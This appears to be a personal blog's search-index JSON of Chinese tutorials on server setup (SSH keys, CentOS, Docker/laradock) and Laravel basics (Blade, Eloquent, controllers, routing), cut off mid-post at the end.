{"pages":[{"title":"categories","text":"","link":"/categories/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"","text":"使用秘钥连接之后终端可以直接快速连接，而且使用 VS Code 的时候也可以免输密码 这里建议使用 VS Code 来当进行 ssh 连接。 VS Code 不仅可以连接终端，还可以直接对服务器上的文件进行编辑。 使用 VS Code 远程连接服务器 生成和保存秘钥生成秘钥，执行后直接回车三下即可 1ssh-keygen 进入 /root/.ssh 目录，执行以下指令 123456# 创建授权秘钥touch authorized_keys# 将公钥写进授权秘钥中cat id_rsa.pub &gt;&gt; authorized_keys# 为了安全，修改授权秘钥的权限chmod 600 authorized_keys 下载私钥文件 id_rsa 到本地，当然也可以使用 ftp 或者 sz 建议保存到用户名下的 .ssh 目录下中，以方便之后的远程连接 开启秘钥登录打开 /etc/ssh/sshd_config ，将 RSAAuthentication 和 PubkeyAuthentication 前面的注释去掉 接着重启 sshd 服务，执行 1systemctl restart sshd 配置连接信息编辑 .ssh 文件夹下的 config 文件夹，添加主机的信息。 12345# ip地址被我用#和谐了Host Mjc_root HostName 101.###.###.11 User root IdentityFile ~/.ssh/id_rsa_mjc 接着就可以使用各种终端连接了","link":"/post/1528.html"},{"title":"CentOS 修改主机名","text":"CentOS 与其他 Linux 有些许不同，可以直接使用下面的指令设置主机名 1hostnamectl set-hostname 主机名 但是传入的 hostname 中的大写字母会自动转化成小写字母，可以接着用下面这个指令来另外设置 1hostnamectl --static set-hostname 主机名 一旦修改了静态主机名，/etc/hostname 将被自动更新。 然而，/etc/hosts 不会更新以保存所做的修改，所以你每次在修改主机名后一定要手动更新/etc/hosts，之后再重启CentOS 7。否则系统再启动时会很慢。 参考资料：https://www.jianshu.com/p/39d7000dfa47","link":"/post/65134.html"},{"title":"CentOS 安装高版本 git","text":"来源：栈越 12yum install http://opensource.wandisco.com/centos/7/git/x86_64/wandisco-git-release-7-2.noarch.rpmyum install git 一路 y 下去就行了 安装完成后输入一下指令就可以输出 Git 版本 1git --version","link":"/post/24889.html"},{"title":"Docker 部署 LNMP 和 Laravel","text":"本文使用 laradock 这个轮子去用 Docker 搭建 LNMP + Laravel 环境。 本文需要对 Linux 、 Laravel 有些许了解 环境是 阿里云的 CentOS7.6 ，如果是云服务器，记得在防火墙里开启 22 、 80 、 3306 等端口 Q&amp;AQ: 为什么选择 Docker A: docker 可以方便的部署 LNMP / LAMP 环境，只需要列出清单或者使用别人分享的配置就可以一键部署环境。 Q: 为什么不使用 Apache 提供 web 服务 A: Nginx 是大势所趋，或者说我想多学一个 Docker建议直接参阅 菜鸟教程 的 CentOS Docker 安装 ，非常的简洁易懂 安装安装支持工具 1sudo yum install -y yum-utils device-mapper-persistent-data lvm2 添加阿里源 1sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 更新 yum 缓存 1sudo yum makecache fast 安装 Docker 1sudo yum -y install docker-ce 启动 Docker 1sudo systemctl start docker 镜像加速编辑（没有就新建） /etc/docker/daemon.json ，加入 123{ &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]} 阿里云加速 Laradock建议结合 laradock 的 文档 / 中文文档 进行阅读，预先了解 laradock 中关于 docker-compose 的相关指令 安装安装 Git ，这里第一步是更新 Git 的源，因为 CentOS 默认的 Git 版本过低。安装过程一路 y 即可 12yum install http://opensource.wandisco.com/centos/7/git/x86_64/wandisco-git-release-7-2.noarch.rpmyum install git 从 GitHub 上拉取 laradock 1git clone https://github.com/laradock/laradock.git /usr/local/laradock 我在这里指定下载到 /usr/local/laradock 我打算将 web 服务放在 /web ，因此需要将 laradock 复制到 /web 中 在根目录创建 web 目录 1mkdir /web 复制 laradock 到 /web/lardock 1cp -r /usr/local/laradock/ /web/laradock 进入复制好的 laradock/ 1cd /web/laradock 修改配置复制 .env 文件 1cp env-example .env 需要修改 .env 文件来个性化安装容器，下面是本文涉及到的配置 变量名 作用 APP_CODE_PATH_HOST 项目位置 CHANGE_SOURCE 国内环境镜像加速 WORKSPACE_NPM_REGISTRY NPM 源 WORKSPACE_COMPOSER_REPO_PACKAGIST COMPOSER 源 WORKSPACE_INSTALL_XDEBUG Xdebug扩展 PHP_FPM_INSTALL_XDEBUG Xdebug扩展 项目位置我的 laravel 项目想命名为 yeek 所以 1APP_CODE_PATH_HOST=../ 所以也要修改 nginx 的站点设置。在 laradock/nginx/sites/ 先备份原先的 default.conf 1mv default.conf default.conf.example laradock 给我们准备了一个 laravel 站点配置的示例文件，直接拿来用就行了 1mv laravel.conf.example default.conf 然后将 root 后面路径里的 laravel 改为 yeek 换源使用国内源 1CHANGE_SOURCE=true Composer 使用阿里源 1WORKSPACE_COMPOSER_REPO_PACKAGIST=https://mirrors.aliyun.com/composer/ NPM 使用淘宝源 1WORKSPACE_NPM_REGISTRY=https://registry.npm.taobao.org MySQL版本MySQL 建议使用 5.7 或者其他低版本，否则密码可能不兼容远程连接软件， 1MYSQL_VERSION=5.7 MySQL项里还有其他配置，按需设置 123456789### MYSQL #################################################MYSQL_VERSION=5.7MYSQL_DATABASE=defaultMYSQL_USER=defaultMYSQL_PASSWORD=secretMYSQL_PORT=3306MYSQL_ROOT_PASSWORD=rootMYSQL_ENTRYPOINT_INITDB=./mysql/docker-entrypoint-initdb.d 开启 Xdebug12WORKSPACE_INSTALL_XDEBUG=truePHP_FPM_INSTALL_XDEBUG=true 其他YARN 的安装是在是太慢了，而且暂时用不上，所以关掉 1WORKSPACE_INSTALL_YARN=false Docker Composelaradock需要 docker-compose 的支持，因此安装 Docker Compose 可以去官网看最新版本的下载链接：在Linux系统上安装Compose 1sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.25.0/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose 安装过程挺漫长的，漫长到我在第二次安装的时候，实在顶不住试了这个方法 编辑 /etc/ssh/ssh_config，找到 GSSAPIAuthentication no 这行，删掉前面的注释，然后保存退出 –解决阿里云ECS服务器 git clone 速度慢 然后写入权限 1sudo chmod +x /usr/local/bin/docker-compose 安装 Nginx MySQL 容器在 laradock 这个目录下启动 Nginx 和 MySQL 容器 1docker-compose up -d nginx mysql 注意： docker-compose 指令只能在有 docker-compose.yml 文件的目录中执行 第一次安装时间比安装 Docker Compose 还要漫长 期间看到红色的不要慌张，都是正常情况 这里有特别多的坑 安装完成看到这几个容器都 done 则说明 Nginx 和 MySQL 安装完成了 此时访问服务器，返回的应该是 404 Not Found nginx 在 /web/yeek/public 下新建一个 index.php ，内容是 12&lt;?php phpinfo(); 新建完成后刷新页面，出现了 phpinfo ，可以检查安装的扩展。 然后删掉 yeek 目录，准备 Laravel 的安装。 Laravel安装在之前的 laradock 目录进入 工作区 1docker-compose exec workspace bash 使用 Composer 安装 Laravel 这里指定了 Laravel 的项目名是 laravel 版本是 5.7.* , 网站的文件夹是 yeek 1composer create-project --prefer-dist laravel/laravel yeek 5.7.* 权限安装完成后，回到服务器，给予缓存和日志权限 123# 要记得先退出 workspace 容器cd /web/yeeksudo chmod -R 777 storage bootstrap/cache 访问服务器，页面出现 Laravel 的 欢迎页面 数据库在 docker 容器中，容器间的连接需要使用 容器名 而不是ip 地址，因此在 .env 中需要将 1DB_HOST=127.0.0.1 改为 1DB_HOST=mysql 天坑操作系统 / Docker 容器端口占用 阿里云的 CentOS 可能会自带 Apache(httpd) / MySQL ，他们会占用 80 / 3306 端口，建议安装容器前先检查一下 修改配置不生效 需要重构 1docker-compose build {container-name} 安装容器慢 超过5分钟建议 Ctrl+C 终止，然后重建 1docker-compose build {container-name} Laravel内存不足 安装 Laravel 时出现 1proc_open(): fork failed - Cannot allocate memory 使用添加内存三连： 123dd if=/dev/zero of=/var/swap.1 bs=1M count=1024mkswap /var/swap.1swapon /var/swap.1 参考: 添加内存 和 docker内无法添加 虽然在 docker 里无法添加内存，但是执行指令之后退出 workspace 再进入之后，就可以继续安装了 安装完 Laravel 后不是 欢迎页面 或者是 1There is no existing directory at &quot;/var/www/laravel/storage/logs&quot; and its not buildable: Permission denied 在 Laravel 的根目录 1sudo chmod -R 777 storage bootstrap/cache 数据库 / MySQL数据库连接失败 1SQLSTATE[HY000] [2002] Connection refused 去 .env 配置数据库信息 更改数据库版本后容器启动失败 1234567891011121314151617# 修改 .env 文件MYSQL_VERSION=5.7 # 默认为 latest#停止mysql容器docker-compose stop mysql# 删除旧数据库数据 rm -rf ~/.laradock/data/mysql # ！注意重启docker应用，然后再构建新 mysql docker-compose build mysql # 重新创建容器 docker-compose up -d nginx mysql # 查看现有 mysql 版本 docker inspect laradock_mysql_1","link":"/post/20398.html"},{"title":"Laravel 基础 Blade模板","text":"Blade 是 Laravel 提供的一个简单而又强大的模板引擎。主要参考了 Laravel 中文网的文档 笔记归档Laravel 基础教程 笔记 简介 Blade 并不限制你在视图中使用原生 PHP 代码。 所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何负担。 Blade 视图文件使用 .blade.php 作为文件扩展名，被存放在 resources/views目录。 模板继承定义布局这个是是教程中的基础模板，位置放在 resources\\views\\layouts.blade.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Laravel 基础教程 | Moreant&lt;/title&gt; &lt;style&gt; header { width: 1000px; height: 150px; margin: 0 auto; background: #f5f5f5; border: 1px solid #ddd; } main { width: 1000px; height: 300px; margin: 0 auto; margin-top: 15px; clear: both; } main nav { float: left; width: 20%; height: inherit; background: #f5f5f5; border: 1px solid #ddd; } main .content { float: right; width: 75%; height: inherit; background: #f5f5f5; border: 1px solid #ddd; } footer { width: 1000px; height: 150px; margin: 0 auto; margin-top: 15px; background: #f5f5f5; border: 1px solid #ddd; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;header&gt; 头部 &lt;/header&gt; &lt;main&gt; &lt;nav&gt; 侧边栏 &lt;/nav&gt; &lt;div class=&quot;content&quot;&gt; 主要内容区域 &lt;/div&gt; &lt;/main&gt; &lt;footer&gt; 底部 &lt;/footer&gt;&lt;/body&gt;&lt;/html&gt; 然后在 body 里定义布局，添加 @section 和 @yield 标记： 12345678910111213141516171819202122&lt;body&gt; &lt;header&gt; @section('header') 头部 @show &lt;/header&gt; &lt;main&gt; &lt;nav&gt; @section('nav') 侧边栏 @show &lt;/nav&gt; &lt;div class=&quot;content&quot;&gt; @yield('content','主要内容区域') &lt;/div&gt; &lt;/main&gt; &lt;footer&gt; @section('footer') 底部 @show &lt;/footer&gt;&lt;/body&gt; @section 和 @yield 的区别是： @section 标记的重点是部分 @yield 标记的重点是位置 继承布局我们创建的是 student 的视图，因此视图的位置是 resource\\views*student***section1.blade.php ： 1234567891011121314151617@extends('layouts')@section('title','Section1')@section('header')@parent&lt;h1&gt;header&lt;/h1&gt;@endsection@section('content')主要@endsection@section('footer','&lt;h1&gt;底部在这里&lt;h1&gt;') @extends：指定继承的布局 @section：指定替换父视图的部分，有两种写法 @parent：指定在这个 @section 中是增加内容，而不是覆盖 然后在 控制器 中指定渲染的视图 123456public function section1() { // 也可以用 / 来表示层级 如 student/section1 return view('student.section1'); } 或者直接在路由中输出视图 1Route::view('ss','student.section1'); Components &amp; Slotscomponents 会主动引用视图，常用于设置复用的部分 基础使用 比如有一个会在整个应用中复用的警告，位置在 respurces\\views\\alert.blade.php： 123&lt;div class=&quot;alert alert-danger&quot;&gt; {{ $slot }}&lt;/div&gt; 然后在需要使用这个警告的地方标记： 123@component('alert')You are not allowed to access this resource!@endcomponent slot 由于任何没有被 @slot 指令包裹住的内容将传递给组件中的 $slot 变量： 显示效果是这样的 @slot 是用于注入内容到已知的 slot 中，比如我们需要在上面的基础上添加标题： 12345&lt;div class=&quot;alert alert-danger&quot;&gt; &lt;div class=&quot;alert-title&quot;&gt;{{ $title }}&lt;/div&gt; {{ $slot }}&lt;/div&gt; 在需要使用的地方这样标记： 1234567@component('alert')@slot('title')Forbidden@endslotYou are not allowed to access this resource!@endcomponent 显示效果 传递数据 当然也可以传递数据，首先定义要显示的数据，在上面的基础上添加用户名： 1234&lt;div class=&quot;alert alert-danger&quot;&gt; &lt;div class=&quot;alert-title&quot;&gt;{{ $title }}&lt;/div&gt; {{ $name }} - {{ $slot }}&lt;/div&gt; 使用的时候在 component 的第二个参数传入数组即可： 1234567@component('alert',['name'=&gt;'moreant'])@slot('title')Forbidden@endslotYou are not allowed to access this resource!@endcomponent 效果 组件别名 子目录中的 Blade 组件，使用别名访问更方便。现在假设有一个 Blade 组件存储在 resources/views/components/alert.blade.php，可以使用 component 方法给它起个 alert 的别名。通常，在 AppServiceProvider 的 boot 方法中完成这个操作： 123use Illuminate\\Support\\Facades\\Blade;Blade::component('components.alert', 'alert'); 组件定义好别名后，使用指令渲染： 123@alert(['type' =&gt; 'danger']) You are not allowed to access this resource!@endalert 也可以不传参数： 123@alert You are not allowed to access this resource!@endalert 数据处理传入数据在上面的 模板继承 中已经涉及到一部分的数据传入了 component的传入数据 可以在 view 的第二个参数中传入数组 123Route::get('greeting', function () { return view('welcome', ['name' =&gt; 'Samantha']);}); 模板是php文件，自然也能使用php函数，例如在之前的警告中加入时间 1234&lt;div class=&quot;alert alert-danger&quot;&gt; &lt;div class=&quot;alert-title&quot;&gt;{{ $title }} - {{ date('H:i:s') }} &lt;/div&gt; {{ $slot }}&lt;/div&gt; 示未转义数据 默认情况下，Blade ` {{ }} `语句会自动调用 PHP 的 htmlspecialchars 函数防止 XSS 攻击。不想转义的话，可以使用以下语法： 1Hello, {!! $name !!}. 渲染 JSON有时，为了初始化 JavaScript 变量，需要将传入视图的数组进行 JSON 化。例如： 123&lt;script&gt; var app = &lt;?php echo json_encode($array); ?&gt;;&lt;/script&gt; 然而，可以用 @json Blade 指令替代手动 json_encode： 123&lt;script&gt; var app = @json($array);&lt;/script&gt; 原样输出由于许多 JavaScript 框架都使用花括号来表示给定的表达式应用在浏览器中显示，你可以使用 @ 符号来告知 Blade 渲染引擎你需要保留这个表达式的原始形态。例如： 123&lt;h1&gt;Laravel&lt;/h1&gt;Hello, @{{ name }}. 在这个例子中， @ 符号最终将会被 Blade 引擎删除；达到不受 Blade 模版引擎影响的目的， 最终 ``表达式会保持不变使得 JavaScript 框架可以使用它。 @verbatim 指令 在页面中如果你需要大部分内容展现 JavaScript 变量，你可以使用 @verbatim 指令来包裹 HTML 内容，这样你就不必在每个 Blade 打印语句前加上 @ 符号： 12345@verbatim &lt;div class=&quot;container&quot;&gt; Hello, {{ name }}. &lt;/div&gt;@endverbatim 结构控制循环控制blade 提供了 @if 、 @elseif 、 @else 和 @endif 来构造 if 表达式、 1234567@if (count($records) === 1) 我有一个记录！@elseif (count($records) &gt; 1) 我有多个记录！@else 我没有任何记录！@endif 为了方便， Blade 还提供了一个 @unless 指令： 123@unless (Auth::check()) 您还没有登录。@endunless 除了上述的条件指令之外， @isset 和 @empty 指令也可以视为与 PHP 函数有相同的功能： 1234567@isset($records) // $records 被定义且不为空...@endisset@empty($records) // $records 是 &quot;empty&quot; 的...@endempty 使用循环时，你也可以结束循环或跳过当前迭代： 1234567891011@foreach ($users as $user) @if ($user-&gt;type == 1) @continue @endif &lt;li&gt;{{ $user-&gt;name }}&lt;/li&gt; @if ($user-&gt;number == 5) @break @endif@endforeach 你也可使用单行指令来包含指令声明条件： 1234567@foreach ($users as $user) @continue($user-&gt;type == 1) &lt;li&gt;{{ $user-&gt;name }}&lt;/li&gt; @break($user-&gt;number == 5)@endforeach forelse 12345@forelse ($users as $user) &lt;li&gt;{{ $user-&gt;name }}&lt;/li&gt;@empty &lt;p&gt;No users&lt;/p&gt;@endforelse 循环变量循环时，可以在循环内使用 $loop 变量。这个变量可以提供一些有用的信息，比如当前循环的索引，当前循环是否为首次迭代，抑或当前循环是否为末次迭代： 1234567891011@foreach ($users as $user) @if ($loop-&gt;first) This is the first iteration. @endif @if ($loop-&gt;last) This is the last iteration. @endif &lt;p&gt;This is user {{ $user-&gt;id }}&lt;/p&gt;@endforeach 在一个嵌套的循环中，可以通过使用 $loop 变量的 parent 属性来获取父循环中的 $loop 变量： 1234567@foreach ($users as $user) @foreach ($user-&gt;posts as $post) @if ($loop-&gt;parent-&gt;first) This is first iteration of the parent loop. @endif @endforeach@endforeach $loop 变量也包含了其它各种有用的属性： 属性 描述 $loop-&gt;index 当前循环迭代的索引（从 0 开始）。 $loop-&gt;iteration 当前循环迭代 （从 1 开始）。 $loop-&gt;remaining 循环中剩余迭代数量。 $loop-&gt;count 迭代中的数组元素总数。 $loop-&gt;first 当前迭代是否为循环中的首次迭代。 $loop-&gt;last 当前迭代是否为循环中的末次迭代。 $loop-&gt;depth 当前循环的嵌套深度级别。 $loop-&gt;parent 在嵌套循环中，父循环的 loop 变量。 引入子视图Blade 的 @include 指令允许你从另一个视图中引入 Blade 视图。所有在父视图的可用变量在被引入的视图中都是可用的。 1234567&lt;div&gt; @include('shared.errors') &lt;form&gt; &lt;!--表单内容 --&gt; &lt;/form&gt;&lt;/div&gt; 被引入的视图会继承父视图中的所有数据，同时也可以向引入的视图传递额外的数组数据： 1@include('view.name', ['some' =&gt; 'data']) 当然，如果尝试使用 @include 去引入一个不存在的视图，Laravel 会抛出一个错误。如果想引入一个不能确定存在与否的视图，你应当使用 @includeIf 指令： 1@includeIf('view.name', ['some' =&gt; 'data']) 如果想根据给定的布尔条件来 @include 一个视图，你可以使用 @includeWhen 指令： 1@includeWhen($boolean, 'view.name', ['some' =&gt; 'data']) 如果想引入给定视图数组中的第一个视图，你可以使用 includeFirst 指令： 1@includeFirst(['custom.admin', 'admin'], ['some' =&gt; 'data']) 更多关于 Blade 模板 的使用方法在 这里 堆栈 服务注入 Blade 扩展 自定义 If 语句","link":"/post/29874.html"},{"title":"Laravel 基础 Eloquent ORM 操作数据库","text":"数据库表通常相互关联。 例如，一篇博客文章可能有许多评论，或者一个订单对应一个下单用户。Eloquent 让这些关联的管理和使用变得简单，并支持多种类型的关联 Eloquent ORM 可以通过 模型-数据库 来交互，使用模型来查询、插入、更新、删除。同时，Eloquent 可以使用查询构造器的所有功能 更多介绍 笔记归档Laravel 基础教程 笔记 模型建立模型，也就是 Model ，位置在 app\\ 。使用 Eloquent ORM 模型的基本如下： 123456789101112131415&lt;?phpnamespace App;// use 是必须的use Illuminate\\Database\\Eloquent\\Model;class Student extends Model{ // 指定表名 protected $table = 'student'; // 指定 id protected $primaryKey = 'id';} 如果不指定 $table 就会假定关联的表名是模型名+s，如此例的表名就是 students 查询查询返回的类型都是对象。 常用的查询方法有： all / find / findOrfail Eloquent 模型充当一个查询构造器 ，所以也可以添加查询条件： 1$student = Student::where('id','&gt;=','1005')-&gt;get(); all 返回表中的所有数据： 1$student = Student::all(); find 根据主键查找： 1$student = Student::find(1003); findOrFail 在 find() 的基础上，如果找不到就返回404： 1$student = Student::findOrFail(1010); 创建创建常用的方法有： save / create / fill / firstOrCreate / firstOrNew / updateOrCreate 基本使用使用对象创建数据： 1234$student = new Student();$student-&gt;name = 'moreant';$student-&gt;age = '18';$result = $student-&gt;save(); 用这个方法新增数据，Laravel 会自动在 created_at 和 update_at 中插入时间戳，并且维护。 批量赋值首先需要去模型中指定 fillable 或 guarded 属性，因为所有的 Eloquent 模型在默认情况下都不能进行批量赋值。 123456789101112131415&lt;?phpnamespace App;// use 是必须的use Illuminate\\Database\\Eloquent\\Model;class Student extends Model{ // 可以批量赋值的属性 protected $fillable = ['name','age']; // 不可以批量赋值的属性 protected $guarded = ['id'];} 注意，在使用上，只能是 $fillable 或 $guarded 二选一。 将 $guarded 定义为空数组，则所有属性都可以被批量赋值 之后，就可以使用 create() 插入新数据，并且返回刚刚保存的实例： 1$student = Student::create(['name' =&gt; 'imooc', 'age' =&gt; 3]); 或者使用实例中的 fill() 来赋值 1$student-&gt;fill(['name' =&gt; 'imooc', 'age' =&gt; 3]); 时间戳如果不需要，可以关闭时间戳，只需要在模型中将 $timestamps 属性设置为 false： 1234567891011&lt;?phpnamespace App;use Illuminate\\Database\\Eloquent\\Model;class Student extends Model{ // 是否维护时间戳 public $timestamps = false;} 设置为时间戳为中国时间： 在 config\\app.php 中修改 timezone 属性， 1'timezone' =&gt; 'Asia/Shanghai' 指定时间戳的格式： 1protected $dateFormat = 'U'; 自定义时间戳字段名： 12const CREATED_AT = 'creation_date';const UPDATED_AT = 'last_update'; 其他创建方法有三种常用的创建方法 firstOrCreate/ firstOrNew / updateOrCreate firstOrCreate 用给定的值查找数据库，如果不存在，则插入记录到数据库中。返回插入后的实例。 查询 name 为 morea3 的数据，查到返回对象，查不到用给定的参数创建： 1$student = Student::firstOrCreate(['name' =&gt; 'morea3'],['age'=&gt;29]); firstOrNew 与 firstOrCreat 相似，只不过返回的是一个未保存的实例，需要使用 save 方法来保存： 1$student = Student::firstOrNew(['name' =&gt; 'morea66'],['age'=&gt;18]); updateOrCreate 更新版的 firstOrCreate 1$student = Student::firstOrCreate(['name' =&gt; 'morea'],['age'=&gt;18]); 更新基本使用： 123$student = Student::find(10);$student-&gt;name = &quot;immoc&quot;;$status = $student-&gt;save(); 使用 where 方法查找对象，并且更新 123$student = Student::where('name','=','moreant')-&gt;first();$student-&gt;age = 20;$status = $student-&gt;save(); 删除删除的常用方法有： delete / destory / 通过模型删除 12$student = Student::find(13);$result = $student-&gt;delete(); 通过主键删除 12345Student::destory(1);Student::destory(1,2);Student::destory([1,2,3]); 通过查询删除 1$result = Student::where('id','&gt;=','4')-&gt;delete();","link":"/post/39513.html"},{"title":"Laravel 基础 控制器","text":"Laravel 框架第二篇——控制器，控制器的介绍在慕课网的视频教程中说的非常少（6分钟），而且大部分都是跟路由的连接。 Laravel China 社区的文档就非常详尽 笔记归档Laravel 基础教程 笔记 基础使用定义控制器控制器目录： App\\Http\\Controllers 例如 MemberController.php 文件名： 名字+Controller 命名空间 App\\Http\\Controllers 继承 Controller 1234567891011&lt;?phpnamespace App\\Http\\Controllers;class MemberController extends Controller{ public function info($id) { return 'member-info-'.$id; }} 关联路由1Route::get('member/{id}','MemberController@info'); 传递参数","link":"/post/30761.html"},{"title":"Laravel 基础 数据库操作","text":"Laravel 有三种数据库操作方式，DB Facades , 查询构造器 , Eloquent ORM 笔记归档Laravel 基础教程 笔记 连接数据库打开根目录的 .env 文件 9~14行就是数据库的配置信息了： 123456DB_CONNECTION=mysqlDB_HOST=localhostDB_PORT=3306DB_DATABASE=laravelDB_USERNAME=rootDB_PASSWORD= 演示中的创建表： 123456789101112131415create table if not exists student(`id` INT AUTO_INCREMENT PRIMARY KEY,`name` VARCHAR(255) NOT NULL DEFAULT '' COMMENT '姓名',`age` TINYINT UNSIGNED not null DEFAULT 0 COMMENT '年龄',`sex` TINYINT UNSIGNED not null DEFAULT 10 COMMENT '性别',`created_at` DATETIME NULL DEFAULT NULL COMMENT '新增时间',`updated_at` DATETIME NULL DEFAULT NULL COMMENT '修改时间')ENGINE=INNODB DEFAULT CHARSET=UTF8 AUTO_INCREMENT=1001 COMMENT='学生表'; DB FacadesLaravel 给我们提供了 Facades 来更方便的使用静态接口。 所有的 Laravel Facades 都定义在 Illuminate\\Support\\Facades 命名空间下。 主要的方法有： select / insert / update / delete 使用 DB Facades 一定要 use： 1234567891011121314&lt;?phpnamespace App\\Http\\Controllers;// 一般 use 都放这里use Illuminate\\Support\\Facades\\DB;class StudentController extends Controller{ public function test() { // 操作 }} 查询： 1$arr = DB::select('select * from student'); 插入： 1$bool = DB::insert('insert into student (name, age) values (?, ?)', ['moreant', 18]); 更新： 1$int = DB::update('update student set age = ? where name = ?', ['19','moreant']); 删除： 1$int2 = DB::delete('delete from student where id &gt; ?', [1005]); 了解更多 Facades 查询构造器Laravel 的查询构造器使用了 PDO 参数绑定来免受 SQL 注入攻击 插入常用的插入方法有： insert / insertGetId 简单插入： 1234$bool = DB::table('student')-&gt;insert( ['name'=&gt;'test','age'=&gt;20]); 获得自增 id： 123$id = DB::table('student')-&gt;insertGetId( ['name'=&gt;'boob','age'=&gt;22]); 插入多条数据： 1234567$bool = DB::table('student')-&gt;insertGetId( [ ['name'=&gt;'boob','age'=&gt;15], ['name'=&gt;'sanm','age'=&gt;17], ['name'=&gt;'job','age'=&gt;14], ]); 更新与自增常用的更新方法有： update / increment / decrement 基本使用： 123$cow = DB::table('student') -&gt;where('age', 19) -&gt;update(['age' =&gt; 21]); 自增 1： 1$cow = DB::table('student')-&gt;increment('age'); 自增 3： 1$cow = DB::table('student')-&gt;increment('age', 3); 自减： 1$cow = DB::table('student')-&gt;decrement('age', 2); 有条件的自增： 123$cow = DB::table('student') -&gt;where('name', 'moreant') -&gt;increment('age', 4); 在自增同时修改其他数据： 123$cow = DB::table('student') -&gt;where('name', 'test') -&gt;increment('age', 4, ['name' =&gt; 'myTest']); 删除常用的删除方法有： delete / truncate 删除指定条件： 123$num = DB::table('student') -&gt;where('id', '1004') -&gt;delete(); 范围条件： 123$num = DB::table('student') -&gt;where('id', '&gt;=', '1004') -&gt;delete(); 清空表 1DB::table('student')-&gt;truncate(); 查询常用的查询方法有： get / first / where / pluck / select / chunk get() 获取所有表数据： 1$student = DB::table('student')-&gt;get(); first() 第一条数据： 1$student = DB::table('student')-&gt;first(); 可以修改排序： 123$student = DB::table('student') -&gt;orderBy('id','abs') -&gt;first(); where() 条件查询： 123$student = DB::table('student') -&gt;where('id', '&gt;=', '1002') -&gt;get(); 多条件查询： 123$student = DB::table('student') -&gt;whereRaw('id &gt;= ? and age &gt;= ?',[1004,19]) -&gt;get(); pluck() 返回指定字段： 12$student = DB::table('student') -&gt;pluck('name'); 自定义键值： 123$student = DB::table('student') -&gt;whereRaw('id &gt;= ? and age &gt;= ?',[1004,19]) -&gt;pluck('name','id'); select() 指定返回的字段： 123$student = DB::table('student') -&gt;select('id','name') -&gt;get(); chunk() 分块结果，一次获取结果集的一小块，并将其传递给 闭包 函数进行处理： 123DB::table('student')-&gt;orderBy('id')-&gt;chunk(3, function ($students) { var_dump($students);}); 可以通过在 闭包 中返回 false 来终止继续获取分块结果： 1234DB::table('student')-&gt;orderBy('id')-&gt;chunk(3, function ($users) { // Process the records... return false;}); 聚合函数常用的聚合函数方法有： count / max / min / avg / sum count 查询结果的总数： 1$num = DB::table('student')-&gt;count(); 都可以结合其他查询语句： 123$num = DB::table('student') -&gt;where('id','&gt;=','1005') -&gt;count(); max 查询结果的返回最大值 1$max = DB::table('student')-&gt;max('age'); min 查询结果的返回最小值： 1$min = DB::table('student')-&gt;min('age'); avg 平均值： 1$avg = DB::table('student')-&gt;avg('age'); sum 总和： 1$sum = DB::table('student')-&gt;sum('age');","link":"/post/37751.html"},{"title":"Laravel 基础 视图","text":"慕课网教程里的视图讲的比之前控制器就更少了，详细的内容以后读完 Laravel China 社区里的文档再补 笔记归档Laravel 基础教程 笔记 基本使用视图目录： resources\\views\\ 在视图目录中新建一个 member-info.php 1Hello 在控制器中输出视图 1234567891011&lt;?phpnamespace App\\Http\\Controllers;class MemberController extends Controller{ public function info($id) { return view('member-info'); }} 路由中直接输出 1Route::view('member','member-info'); 更多请参考 路由 传递参数 首先文件名是 *.blade.php 表示是模板文件才可以传递参数， Blade 模板的更多信息在 这里 控制器中 123456public function info($name=null) { return view('member/info', [ 'name' =&gt; $name ]); } 层级关系用 . 也是可以的 123return view('member.info', [ 'name' =&gt; $name ]); 路由中 123Route::get('test/', function () { return view('test', ['name' =&gt; 'moreant']);}); 或者直接使用 view 方法 1Route::view('/test2','test',['name' =&gt; 'moreant-test']);","link":"/post/45228.html"},{"title":"Laravel 基础 路由","text":"考web前端证需要学习一个 php 框架，学校没有选择以前的 tp5 而是选择了 Laravel。真就还没学会 tp5 又要入门 Laravel 呗 集成环境 Wampserver3.1.7（PHP 7.2.14） Laravel 5.7.* 笔记归档Laravel 基础教程 笔记 安装安装就不说了，考完证再补笔记 前言初学者了解目录结构，有利于对框架的快速入门 [ Laravel 5.8 文档 ] 快速入门 —— 目录结构 参考文档 Laravel 5.8 中文文档 索引Laravel 基础教程 笔记 在 Laravel57 中，所有 Laravel 路由都定义在位于 routes 目录下的路由文件中，有四个路由文件： web.php 支持 Session、CSRF 保护以及 Cookie 加密功能 api.php 支持频率限制功能，这些路由是无状态的，所以请求通过这些路由进入应用需要通过 token 进行认证并且不能访问 Session 状态。 console.php 定义了基于控制台的应用入口（路由）。 channels.php 注册应用支持的所有事件广播频道。 基本路由12345678//getRoute::get('base1',function(){ return &quot;Hello World&quot;;});//postRoute::post('base2',function(){ return &quot;Base2&quot;;}); 重定向1Route::redirect('/here', '/there', 301); 其中 here 表示原路由，there 表示重定向之后的路由，301 是一个 HTTP 状态码，用于标识重定向。 命名可以方便的给指定路由生成URL或者重定向 链式调用 name 方法来指定名称： 123Route::get('user/profile', function () { //})-&gt;name('profile'); 然后就可以使用全局辅助函数 route 来生成链接或者重定向： 123456// 生成 URL...$url = route('profile');//url: http://localhost/user/profile// 生成重定向...return redirect()-&gt;route('profile'); 视图123Route::get('/welcome', function () { return view('welcome');}); 也可以直接使用 view 第一个参数是包含视图名称的URL，第二个参数是需要渲染的视图名称，第三个参数是传入的数据（可选） 123Route::view('/welcome','welcome');Route::view('/welcome','welcome',['name' =&gt; 'moreant']); 多请求路由HTTP请求动作有： 123456Route::get($uri, $callback);Route::post($uri, $callback);Route::put($uri, $callback);Route::patch($uri, $callback);Route::delete($uri, $callback);Route::options($uri, $callback); match 指定响应多种的请求动作 any 响应所有请求动作 12345678//只响应 get 和 post Route::match(['get', 'post'], 'multy1', function() { return 